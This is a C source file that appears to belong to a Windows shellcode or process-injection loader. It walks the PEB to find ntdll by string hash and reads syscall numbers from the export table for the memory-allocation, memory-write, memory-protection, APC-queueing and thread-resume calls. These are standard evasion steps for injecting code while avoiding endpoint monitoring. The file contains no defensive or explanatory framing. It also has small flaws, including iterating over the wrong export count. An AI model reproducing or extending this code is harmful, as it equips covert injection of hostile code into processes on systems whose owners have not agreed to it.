# include "NtFunction.h"
# include "Hashing.h"

BOOL GetNtApiTableInfo(PNT_API_TABLE NtApiTable) {
	HMODULE hNtdll = NULL;
#ifdef _WIN64
	PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 
	PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

	LIST_ENTRY header = pPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = header.Flink;
	PLDR_DATA_TABLE_ENTRY ldrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)(pListEntry);
	while (ldrDataTableEntry->FullDllName.Buffer) {
		if (hashNTDLL == HashStringW(ldrDataTableEntry->FullDllName.Buffer)) {
			//wprintf(L"Found: %s\n", ldrDataTableEntry->FullDllName.Buffer);
			hNtdll = (HMODULE)ldrDataTableEntry->Reserved2[0];
		}
		pListEntry = pListEntry->Flink;
		ldrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)(pListEntry);
	}
	PBYTE pBase = (PBYTE)hNtdll;
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	IMAGE_OPTIONAL_HEADER pOptional = pNt->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + pOptional.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD pNameApi = (PDWORD)(pBase + pExport->AddressOfNames);
	PDWORD pAddressApi = (PDWORD)(pBase + pExport->AddressOfFunctions);
	PWORD pOrdinal = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

	for (int i = 0; i < pExport->NumberOfFunctions; i++) {

		PCHAR functionName = (PCHAR)(pBase + pNameApi[i]);
		WORD ordinal = pOrdinal[i];
		DWORD_PTR functionAddress = (DWORD_PTR)(pBase + pAddressApi[ordinal]);
		PBYTE pByte = (PBYTE)functionAddress + 4;
		if (hashNtAllocateVirtualMemory == HASHALGOA(functionName)) {
			
			NtApiTable->NtAllocateVirtualMemory.dwSSN = *pByte;
		}
		else if (hashNtWriteVirtualMemory == HASHALGOA(functionName)) {
			NtApiTable->NtWriteVirtualMemory.dwSSN = *pByte;
		}
		else if (hashNtProtectVirtualMemory == HASHALGOA(functionName)) {
			NtApiTable->NtProtectVirtualMemory.dwSSN = *pByte;
		}
		else if (hashNtQueueApcThread == HASHALGOA(functionName)) {
			NtApiTable->NtQueueApcThread.dwSSN = *pByte;
		}
		else if (hashNtResumeThread == HASHALGOA(functionName)) {
			NtApiTable->NtResumeThread.dwSSN = *pByte;
		}
	}

	return TRUE;
}
